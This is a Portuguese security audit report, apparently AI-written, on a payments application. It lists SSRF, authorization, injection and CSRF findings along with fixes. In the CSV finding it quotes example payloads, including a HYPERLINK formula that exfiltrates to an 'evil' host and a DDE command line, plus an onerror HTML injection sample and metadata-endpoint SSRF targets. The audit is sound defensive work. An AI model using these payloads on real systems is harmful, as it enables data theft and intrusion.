# Relatório de Auditoria de Segurança — pré-produção (`pagamentos`)

> **Fase 1 — Diagnóstico.** Sessão read-only: nenhum arquivo de produção foi alterado.
> Branch `Features`. Data: 2026-06-26. Modelo: claude-opus-4-8 (1M).
> Fonte de verdade do desenho pretendido: `CLAUDE.md`. Divergência documentado-vs-código é achado.
> Nenhum segredo é transcrito — só o NOME da variável. Severidade CVSS-like:
> CRÍTICO | ALTO | MÉDIO | BAIXO | INFO (CRÍTICO/ALTO bloqueiam produção).

---

## 7. Veredito + matriz de risco *(no topo — leitura executiva)*

**Veredito de produção: NÃO PASSA.** Dois achados **CRÍTICOS** (SSRF no download de boleto por
link) e quatro **ALTOS** (criação de usuário sem checagem de admin numa API publicamente exposta;
HTML injection no e-mail de cobrança que **já está em produção**; CRLF em Cc/Subject) precisam ser
fechados antes do go-live.

### Contagem por severidade

| Severidade | Total |
|---|---|
| CRÍTICO | 2 |
| ALTO | 4 |
| MÉDIO | 7 |
| BAIXO | 5 |
| INFO | 6 |

### Matriz área × severidade

| Área | CRÍTICO | ALTO | MÉDIO | BAIXO | INFO |
|---|---|---|---|---|---|
| 1. AuthN/AuthZ (Next) | 0 | 1 | 1 | 1 | 0 |
| 2. RLS / banco | 0 | 0 | 2 | 1 | 1 |
| 3. Superfície Next API | 0 | 0 | 1 | 1 | 1 |
| 4. Pipeline Python (hostil) | 2 | 3 | 2 | 2 | 0 |
| 5. Frontend / XSS / config | 0 | 0 | 1 | 0 | 3 |
| 6. Segredos / deps | 0 | 0 | 0 | 0 | 1 |
| **Total** | **2** | **4** | **7** | **5** | **6** |

### Top 5 a fechar antes do go-live

1. **C-1 + C-2 (CRÍTICO) — SSRF no download de boleto por link** (`read_emails.py`): bloquear
   IP privado/loopback/link-local (metadata `169.254.169.254`), schemes ≠ http(s), portas
   internas, **revalidar a cada redirect** e escopar o cookiejar por host. Alternativa imediata:
   desligar o download-por-link em produção (já há flag no frontend; o backend não tem equivalente).
2. **A-1 (ALTO) — `POST /api/users` sem checagem real de admin** (`lib/users.ts`/`route.ts`): a API
   é **publicamente exposta** via rewrite `/data-api`; hoje qualquer sessão válida cria usuários.
   Adicionar verificação de papel (`403` se não-admin).
3. **A-1 Python (ALTO) — HTML injection no e-mail de cobrança** (`template.py`): `html.escape()`
   em `customer_name`/`document_id` — **a cobrança já envia a clientes reais** (`DEV_MODE=false`).
4. **M1 RLS (MÉDIO, go-live) — verificar RLS dos cadastros pré-existentes** (`company`,
   `financial_account`, `financial_bank`, grupos/subgrupos, `audit_log`): não dá para confirmar
   pelas migrations; rodar as queries de verificação e versionar em `056`.
5. **M-2 API (MÉDIO) + A-2/A-3 (ALTO) — vazamento de erro cru de Postgres no 500 e CRLF em
   Cc/Subject**: mensagem genérica no 500; validar Cc/Subject contra CRLF.

---

## 1. AuthN/AuthZ (Supabase Auth)

### ALTO
**A-1 — `POST /api/users` sem checagem REAL de papel admin; qualquer sessão cria contas**
`apps/api-backend/app/api/users/route.ts:9-24` + `apps/api-backend/lib/users.ts:79-91`
- **Vetor:** usuário comum autenticado envia `POST /api/users` com o próprio Bearer válido e corpo `{name,email,password}`.
- **Pré-condição:** qualquer sessão válida (todo funcionário logado tem). O middleware só exige Bearer válido — não distingue papel.
- **Impacto:** escalonamento de privilégio. `auth.admin.createUser` (service_role, `email_confirm:true`) cria contas arbitrárias já confirmadas — viola a "REGRA FUNDAMENTAL — SEM AUTO-REGISTRO" do `auth-specs.md`. O comentário `route.ts:5` ("ADMIN-ONLY") afirma garantia que o código **não** implementa. **Agravante:** a API é exposta publicamente via `vercel.json` rewrite `/data-api` (não é rede interna).
- **Correção mínima:** após `getAuthenticatedUser`, checar papel (`user.app_metadata.role === 'admin'`, gravado pelo admin no Supabase) → `403` caso contrário.

### MÉDIO
**M-1 — Toda sessão autenticada = poder total no CRUD; segregação de papéis ausente e não documentada**
`apps/api-backend/lib/auth.ts:37-65`, `middleware.ts:11-20`
- **Impacto:** sem multi-tenancy/papéis, todo logado tem leitura+escrita de todo o CRUD. Pode ser aceitável para ferramenta single-org, mas **não está documentado como decisão** e combina-se com A-1 para virar escalonamento pleno. (IDOR puro não se aplica — não há `company_id` por usuário a vazar.)
- **Correção mínima:** documentar explicitamente "toda sessão = admin" como decisão de design, OU introduzir papéis. Sem uma das duas, A-1 permanece aberto.

### BAIXO
**B-1 — `POST /api/emails/read` sem `requireAuth` no handler (depende só do middleware)**
`apps/api-backend/app/api/emails/read/route.ts` — única rota de ação sem defesa-em-profundidade no handler (as outras 13 chamam `requireAuth`). Protegida pelo matcher hoje; corrigir por consistência (`const denied = await requireAuth(req); if (denied) return denied;`).

### Confirmações positivas
- Token validado com a **chave anon** (`lib/auth.ts:16-24,38`), nunca service_role; `401` em ausência/invalidez; `500` em falha de rede (sem fail-open).
- **service_role isolado no servidor**: grep confirmou **nenhum** import de `supabase-admin`/`getSupabaseAdmin` em `frontend-vite`/`portal-next` — a chave não vaza ao bundle.
- Login público por design, mensagem genérica (não revela qual campo errou); `password_hash` nunca exposto.
- Defesa em profundidade: as rotas CRUD chamam `requireAuth` no handler além do middleware.

---

## 2. RLS e privilégio no banco

### Cobertura RLS (das migrations 001→055)

| Tabela | RLS | Policies | Read | Write | Status |
|---|---|---|---|---|---|
| `financial_account_control` | Sim (018) | SELECT auth; ALL service_role; 2× UPDATE auth col (033/036) | authenticated | service_role (+ UPDATE col) | OK |
| `email_control` | Sim (003/019) | SELECT auth; UPDATE col `reviewed_at` (030) | authenticated | service_role (+ col) | OK |
| `email_processing_errors` | Sim (012) | ALL service_role; SELECT auth | authenticated | service_role | OK |
| `supplier` | Sim (029) | SELECT auth | authenticated | service_role (SECURITY DEFINER) | OK |
| `status` | Sim (036) | SELECT auth | authenticated | service_role | OK (read-only) |
| `cobranca_envios_log` / `cobranca_erros_log` | Sim (037) | ALL service_role; SELECT auth | authenticated | service_role | OK |
| `financial_cost_center` / `financial_chart_of_account` | Sim (049) | SELECT auth | authenticated | service_role | OK leitura; escrita = check go-live |
| `storage.objects` (`attachments`) | Supabase | SELECT auth; bucket privado | authenticated | service_role | OK |
| `company`, `financial_account`, `financial_bank`, `..._group`, `..._subgroup`, `audit_log` | **NÃO VERIFICÁVEL** | — | — | — | **ACHADO M1/M2** |

### MÉDIO
**M1 — RLS dos cadastros pré-existentes é inverificável pelas migrations (go-live)**
`supabase/migrations/051:25-58`, `053:11`, `052:34-45` tocam essas tabelas **sem** `ENABLE ROW LEVEL SECURITY`/`CREATE POLICY`.
- **Vetor:** `GET/POST/PATCH/DELETE /rest/v1/financial_bank` com `apikey:<anon>` + `Authorization: Bearer <jwt-usuário>`. Se a tabela estiver com **RLS desabilitado** (estado de fábrica de tabela criada fora de migration), o PostgREST a expõe ao papel `authenticated` conforme os GRANTs — leitura e potencialmente escrita/DELETE.
- **Prova de que o cenário já ocorreu:** a `049` corrigiu `financial_cost_center`/`financial_chart_of_account` que estavam "RLS habilitado **sem policy**" (default-deny) — o estado de RLS desses cadastros foi configurado **à mão**, fora do versionamento.
- **Impacto:** leitura/escrita não-intencional dos cadastros e de `company` (que contém o `email` do pagador, usado como `From` do SMTP).
- **Correção (go-live, não pelas migrations existentes):** para cada tabela rodar
  `SELECT relname, relrowsecurity FROM pg_class WHERE relname='<t>';` e `SELECT * FROM pg_policies WHERE tablename='<t>';`,
  garantir `relrowsecurity=true` + SELECT `TO authenticated` + **nenhuma** policy de escrita p/ `authenticated`, e versionar em `056_rls_cadastros_preexistentes.sql`.

**M2 — `audit_log` não é criado por nenhuma migration** — CLAUDE.md o cita como alvo de limpeza e o padrão Sheild o exige, mas não há `0XX_create_audit_log.sql`. Tabela inverificável quanto a RLS; criar/versionar com RLS (SELECT auth, ALL service_role) ou confirmar no go-live.

### BAIXO
**B1 — `049:23-24` dá `GRANT SELECT` sem `REVOKE INSERT/UPDATE/DELETE`** em `financial_cost_center`/`financial_chart_of_account`. Com RLS+policy de SELECT o default-deny já bloqueia escrita, mas falta a rede secundária de REVOKE (padrão usado em 030/033). Adicionar `REVOKE INSERT,UPDATE,DELETE ... FROM authenticated`.

### INFO
**I1 — `trg_fe_resolve_company` (007:63-70) é SECURITY INVOKER sem `search_path`.** Roda como invoker (service_role na prática) e só chama `resolve_company_id` (DEFINER com `search_path=public` desde 010). Sem escalonamento — registrar para consistência.

### Confirmações positivas
- **GRANT por coluna correto e seguro:** `030`/`033` fazem `REVOKE UPDATE ... FROM authenticated` **antes** de `GRANT UPDATE (col)`; `036` adiciona `status` sobre o REVOKE prévio. **Nenhum** `GRANT UPDATE/INSERT/DELETE` table-wide para `authenticated` em qualquer migration. As policies `USING(true) WITH CHECK(true)` são contidas pelo grant por coluna.
- **Vetor de prova (NÃO executado):** `PATCH /rest/v1/financial_account_control?id=eq.<id>` com `{"amount":0.01}` (ou `{"sk_supplier":999}`) deve retornar **403 `permission denied for column amount`** — o usuário não adultera valor/fornecedor/vencimento via REST. Já `{"status":"pago"}`/`{"has_invoice":true}`/`{"reviewed_at":...}` são permitidos por design.
- `financial_account_control`/`supplier` não têm policy de DELETE/INSERT para `authenticated` — a regra "DELETE só removido da UI" é **reforçada no banco**.
- **Todas as funções SECURITY DEFINER fixam `search_path=public`** (resolve_supplier_id/company_id, _enrich_*, _add_supplier_email, resolve_supplier_for_account, fn_set_status_from_due_date). Nenhuma interpola input não-saneado em `EXECUTE` (o único `EXECUTE format()` em `042` usa identificadores do catálogo via `%I`/`%L`). `resolve_supplier_for_account` tem `GRANT EXECUTE` restrito a `service_role`.
- Migração `anon`→`authenticated` concluída (015); nenhuma policy `TO anon`/`TO public` remanesce; bucket `attachments` privado.

### Itens obrigatórios de go-live (não settláveis pelas migrations)
1. Estado de RLS + policies de `company`, `financial_account`, `financial_bank`, `..._group`, `..._subgroup`, `audit_log`.
2. Confirmar `relrowsecurity=true` em `financial_cost_center`/`financial_chart_of_account` e ausência de policy de escrita p/ `authenticated`.
3. `\dp <tabela>` — confirmar que GRANTs default do role `authenticated` não reintroduzem escrita ampla onde a defesa é só RLS.

---

## 3. Superfície da Next API

### MÉDIO
**M-2 — Vazamento de detalhe interno (mensagem crua de Postgres/PostgREST) no 500 de TODAS as rotas**
Padrão em todos os services/handlers: `lib/contas.ts:153`, `lib/suppliers.ts:154/227`, `lib/lookups.ts:65/94`, `lib/cost-centers.ts:141/207` (e equivalentes), ecoado em `app/api/.../route.ts` via `fail(e.message, 500)`.
- **Vetor:** atacante autenticado provoca falha de banco e lê o corpo do `500`.
- **Impacto:** nomes de tabela/coluna, detalhe de constraint e hints de SQL chegam ao cliente (information disclosure que facilita mapear o schema). Os 4xx (422/409/404/400) usam mensagens pt-BR curadas e são seguros.
- **Correção mínima:** nos services, lançar `500` com mensagem genérica fixa e `console.error(error.message)` server-side; nos handlers, nunca ecoar `e.message` no fallback `500`.

### BAIXO
**B-2 — `financial-accounts` DELETE é hard-delete sem guarda de integridade** (`lib/financial-accounts.ts:141-149`). Baixo e **intencional** (sem FK reversa/sentinela documentado). Reconfirmar no go-live que nada referencia `financial_account`.

### INFO
- **`vercel.json:4-7`** expõe a API publicamente via rewrite `/data-api` → Next API. Toda a proteção depende do middleware Bearer — eleva o peso de **A-1** e **M-2** (não é rede interna isolada).

### Confirmações positivas
- **Mass assignment mitigado por construção dos schemas Zod:** `safeParse` **descarta** chaves desconhecidas (strip, sem `.strict()`); o `inputSchema` faz `.omit(id/company_id/status_id/created_at/updated_at/...)` e o `createSchema` ainda `.omit({status})`. `sk_supplier`/`supplier_id` fora de `editableFields`; `cost_center_id`/`chart_account_id` do supplier só via caminho dedicado. O `insert/update` recebe **só** `parsed.data`, nunca o body cru → strip é suficiente.
- IDs validados (`400` antes de qualquer query). Busca textual sanitizada (`sanitizeTerm` remove `% , ( )`). Lookups dual-mode exigem auth antes de ramificar.
- **Ponte Python sem SSRF:** `python-bridge.ts:7,49-53` — alvo Flask fixo server-side (`PYTHON_SERVICE_URL`), corpo validado (`days` 0..365, `markSeen` boolean), sem URL controlada pelo cliente.

---

## 4. Pipeline Python como superfície hostil

### CRÍTICO
**C-1 — SSRF total no download de boleto por link (sem allowlist de host/scheme/IP)**
`read_emails.py:1543` (`_fetch_url`), `:1584` (`download_pdf_from_url`), `:1602/:1644`.
- **Vetor:** remetente desconhecido põe no corpo um link cujo texto/caminho casa `_LINK_TEXT_RE`/`_LINK_URL_RE` (basta `boleto`/`pagamento`/`documento`/`protocolo` ou path `.pdf`); o pipeline faz `GET` **sem validação de host**.
- **Pré-condição:** Flask/scheduler interno com `.env` (service_role, IMAP/SMTP); leitura automática a cada 5 min sobre qualquer e-mail da INBOX.
- **Impacto:** força o servidor a requisitar **alvos internos** — cloud metadata `169.254.169.254` (roubo de credencial IAM em VM cloud), `localhost`/`127.0.0.1` e portas internas (port-scan/interação GET), IP-literais e hosts internos. `_is_suspicious_link` só cobre **redirecionadores de phishing** (bing/ck, SafeLinks, Proofpoint) — não é anti-SSRF. Salvamento exige assinatura `%PDF` → SSRF "blind", mas há interação + timing observável em `/erros`.
- **Correção mínima:** antes de cada `GET`, rejeitar scheme ≠ http(s); host que resolve para IP `is_private/is_loopback/is_link_local/is_reserved`; IP-literal; porta ∉ {80,443}. Validar **após cada redirect** (C-2). Idealmente, flag de feature no backend para desligar download-por-link em produção.

**C-2 — Redirect segue para alvo interno e vaza cookies entre domínios**
`read_emails.py:1551-1559` (urllib segue redirects por padrão), `:1599` (cookiejar/opener compartilhado), `:1644/:1619`.
- **Vetor:** link público → host do atacante responde `302` → `http://169.254.169.254/...` ou `127.0.0.1`. O urllib segue automaticamente (bypassa allowlist aplicada só ao URL inicial). O **cookiejar compartilhado** reenvia cookie do 1º host a um host diferente alcançado por redirect/link-interno → vazamento de sessão a terceiro.
- **Correção mínima:** `HTTPRedirectHandler` customizado que revalida o destino a cada salto (C-1) e limita o nº de redirects; não reusar o mesmo cookiejar entre hosts de domínios distintos.

### ALTO
**A-1 — HTML injection / XSS no e-mail de cobrança (dados do Firebird sem escape)**
`skills/cobranca-vencidos/scripts/template.py:15` (`{customer_name}`), `:18` (`{document_id}`) — f-string em HTML sem escape; origem `db_firebird.py:32-34/83-84` (`PK.CD_NO`/`PK.TITULO`).
- **Vetor:** nome de cliente `<img src=x onerror=...>` ou `<a href=...>phishing</a>` renderizado cru no e-mail enviado a clientes/representantes reais (**`DEV_MODE=false`, em produção**).
- **Impacto:** injeção de HTML/phishing num e-mail assinado "Departamento Financeiro | Otimotex". `failure_notify.py:51` usa `html.escape()` corretamente — `template.py` é a lacuna.
- **Correção mínima:** `from html import escape`; `escape(customer_name)`/`escape(document_id)` (e por consistência os campos formatados) antes de interpolar.

**A-2 — Header injection (CRLF) em Cc — `cc_email` nunca validado**
`email_sender.py:89` (`msg["Cc"]=actual_cc`), origem `db_firebird.py:88` (`PK.CV_EMAIL`); em `run.py:146` só `primary_email` passa por `validate_email`.
- **Vetor:** `CV_EMAIL` com `\r\n` → cabeçalho/destinatário extra; usado também como envelope-recipient em `sendmail(..., [actual_cc], raw)` (`:108`).
- **Correção mínima:** aplicar `validate_email` (ou rejeitar `\r`/`\n`) a `cc_email` antes de montar a mensagem.

**A-3 — Subject derivado do Firebird sem sanitização de CRLF**
`email_sender.py:85` (`msg["Subject"]=subject`), origem `db_firebird.py:34/89` (`PK.EP_NO`). Mitigado parcialmente pelo gerador do módulo `email`, mas não validado em código. **Correção:** `subject.replace("\r"," ").replace("\n"," ")` antes do header.

### MÉDIO
**M-1 — Endpoints de disparo do Flask sem auth (dependem só de bind localhost) + CSRF**
`server/app.py:213/234` (read/start), `:171` (resend/start), `:279` (`host="127.0.0.1"`). Sem CORS/auth.
- **Vetor:** o bind localhost é a **única** barreira aos endpoints que disparam leitura IMAP e **envio de e-mails reais de cobrança**. Aceitam `get_json(silent=True)` sem checar `Content-Type`/origin → **CSRF-áveis** (página no mesmo host faz `POST 127.0.0.1:8000/api/cobranca/resend/start`).
- **Impacto:** se o Flask for exposto além de localhost (proxy, `0.0.0.0`, container, túnel), qualquer um na rede dispara leitura/reenvio; mesmo em localhost há CSRF via navegador do operador.
- **Correção mínima:** exigir token compartilhado (`Authorization`) nos disparos; validar `Content-Type: application/json` (quebra o CSRF simples); manter bind localhost e documentar.

**M-2 — Path traversal mitigado, mas por ordem de operações (defesa emergente)**
`read_emails.py:635` (`safe_filename`), `:1409/:1574` (`dest_path = PDF_INBOX / dest_name`). Hoje seguro (strip-ASCII antes do `\w` remove `..`/separadores; só o `stem` é usado, sufixo `.pdf` fixo). Sem `resolve()` + checagem de contenção. **Correção:** validar `PDF_INBOX in dest_path.resolve().parents` como invariante explícito.

### BAIXO
- **B-1 — Sem deadline global de leitura no download** (`:1554-1556`, cap 50 MB + timeout de socket 30s): servidor lento pode arrastar até 50 MB × 10 candidatos. Reduzir o cap (~10 MB) e impor deadline total.
- **B-2 — Texto livre extraído (description/supplier_name/subject/email_body_excerpt) sem truncagem** antes do INSERT — sem SQLi (PostgREST faz binding), risco é poluição de dado. Truncar/normalizar (defesa em profundidade).

### Confirmações positivas
- Sem shell/eval/subprocess/pickle no pipeline (extração in-process). Sem SQLi no Firebird (`_QUERY` constante estática, sem concatenação). Sem SQL string-built no Supabase (PostgREST + `urllib.parse.quote` nos filtros).
- `failure_notify.py:51` escapa HTML corretamente (padrão a replicar em `template.py`). CSV de saída é timestamp-based, não atacante-controlado.
- `EMAIL_RE` (`send_core.py:37`) rejeita CRLF — aplicado ao `primary_email` (falta estender a Cc/Subject). Flask bind localhost, um job por vez sob lock; `days` clampado `[0,365]`, `ids` exige lista de inteiros com teto. `extract_pdf_links` limita a 10 candidatos/e-mail.

---

## 5. Frontend / XSS / config

### MÉDIO
**M1 — CSV injection (formula injection) na exportação de `/consulta`**
`apps/frontend-vite/src/pages/Consulta.tsx:99-111` (`exportCsv`).
- **Vetor:** o pipeline grava conteúdo do remetente em colunas exportadas (`email_body_excerpt`, `description`, `processing_notes`, `invoice_number`). `exportCsv` escapa aspas e remove `\r\n`, mas **não** neutraliza células que começam com `= + - @`. Fornecedor hostil envia corpo iniciando com `=HYPERLINK("http://evil/?"&A1)` ou `=cmd|'/c calc'!A1`.
- **Pré-condição:** o operador abre o CSV no Excel/LibreOffice/Sheets (uso esperado).
- **Impacto:** execução de fórmula no computador do operador (exfiltração via `HYPERLINK`/`WEBSERVICE`, RCE via DDE em ambiente legado). Único ponto onde o conteúdo hostil escapa do auto-escaping do React (sai do navegador para outro programa).
- **Correção mínima:** ao montar cada célula, se o valor (trim) começar com `= + - @ \t \r`, prefixar com `'`. Ex.: `const safe = /^[=+\-@\t\r]/.test(s) ? "'" + s : s;`.

### INFO / notas
- **N1 — Tokens de auth em `localStorage` com "Lembrar-me"** (`authStorage.ts:42-48`): tradeoff XSS aceito e razoável (cap de inatividade de 10 min mitiga, vale também na reabertura via `isIdleExpired`). Risco residual limitado. Registrar como risco aceito.
- **N2 — `featureFlags.EMAIL_READER_ENABLED` é defesa só de UI** (`featureFlags.ts:8-9`): oculta os botões, **não** é controle de acesso; o endpoint Flask segue alcançável. Impacto hoje nenhum (Flask local-only, `vercel.json` não reescreve `/api`). Se o Flask for exposto numa VM, os disparos precisarão de auth própria (ver M-1 Python).
- **N3 — Proxy do `vite.config.ts` só vale em dev** (`:31-41`): targets fixos hardcoded, sem open-proxy; o dev server não vai a produção.

### Confirmações positivas
- **Nenhum sink de HTML cru:** grep por `dangerouslySetInnerHTML`/`innerHTML`/`document.write`/`eval`/`new Function`/`insertAdjacentHTML` em todo `src` → **zero**. `email_body_excerpt`/corpo/subject/nomes renderizados como filho JSX (texto auto-escapado) via `ExpandableText`.
- **AttachmentViewer:** URL do `<iframe>` vem **só** de `createSignedUrl('attachments', 300)` (origem Supabase confiável, TTL 300s, bucket privado); `source_file` é só segmento de path, não controla a origem; `<a target="_blank">` com `rel="noopener noreferrer"`.
- **Sem vazamento de segredo:** grep por `SERVICE_ROLE`/`SERVICE_KEY`/`FB_PASSWORD`/`SMTP_PASSWORD`/`ANTHROPIC` no frontend → só comentários. `import.meta.env` lê apenas públicos (`VITE_SUPABASE_URL`/`ANON_KEY`, `VITE_DATA_API_URL`, flags, `VITE_IMAP_USER` exibido como subtítulo). A anon key no bundle é esperada/pública.
- **Sessão fail-closed no relevante:** `getUser()` no restore → `401/403` desloga; falha de rede mantém otimisticamente (deliberado, limitado). Cap de 10 min checado **antes** de restaurar a sessão (sem flash de conteúdo protegido).
- `vercel.json` `/data-api` → Next API protegida por middleware Bearer; rewrite com destino fixo (sem open-proxy).

---

## 6. Segredos e dependências

### Segredos — OK
- **Nenhum `.env` versionado** (não-example) e **nenhum `.env` no histórico** do git. `.gitignore` cobre `.env`, `*.env.local`, `apps/*/.env*`, `data/pdfs_inbox/`, `data/csv_output/`, `data/samples/**`, `logs/`.
- Único conteúdo tracked sob `data/` = `samples/README.md` + `.gitkeep` (sem dado sensível). Os matches de `service_role` em arquivos tracked são o **nome do papel** em RLS/código, não valores.

### Dependências
- **npm audit --omit=dev:** 2 vulnerabilidades **moderate** — `postcss <8.5.10` (XSS via `</style>` no CSS stringify) trazido pelo `postcss` **bundlado pelo `next`**, e `next` dependendo dessa versão. Severidade moderate, vetor de build de CSS (não é vetor de runtime do app). O `fix --force` instala `next@9.3.3` (breaking) — **não aplicar**; acompanhar release do Next que atualize o postcss bundlado.
- **pip list --outdated (INFO):** bumps de patch/minor disponíveis — `cryptography 48→49`, `urllib3 2.6.3→2.7.0`, `requests 2.32.5→2.34.2`, `certifi 2026.5.20→2026.6.17`, `anthropic`, `pdfplumber`, `pypdfium2`. Nenhum CVE específico apontado; recomendado atualizar `urllib3`/`requests`/`cryptography` (relevantes ao download-por-link e TLS) na próxima janela, mantendo o pin `~=`.

---

## 8. Não-achados (confirmações positivas consolidadas)

- AuthZ: token validado com anon key; service_role nunca no bundle; login não vaza campo; `password_hash` nunca exposto; defesa-em-profundidade por handler.
- Banco: GRANT por coluna com REVOKE prévio (sem GRANT table-wide a `authenticated`); SECURITY DEFINER com `search_path` fixo; sem `EXECUTE` com input de usuário; sem policy de DELETE/INSERT p/ `authenticated` nas tabelas-núcleo; sem policy `TO anon` remanescente; bucket privado.
- API: mass-assignment mitigado (strip + só `parsed.data` ao DB); IDs validados; ponte Python sem SSRF; busca sanitizada.
- Python: sem shell/eval/subprocess; sem SQLi (Firebird/Supabase); HTML escapado no digest de falhas; job único sob lock; inputs dos endpoints clampados.
- Frontend: sem sink de HTML cru; AttachmentViewer com signed URL; sem vazamento de segredo; cap de inatividade sem janela de escape.
- Segredos: nada versionado/no histórico; `.gitignore` cobre `.env`/`data`/`logs`.

---

*Fim da Fase 1 (diagnóstico de segurança). Nenhum arquivo de produção foi alterado nesta sessão.*
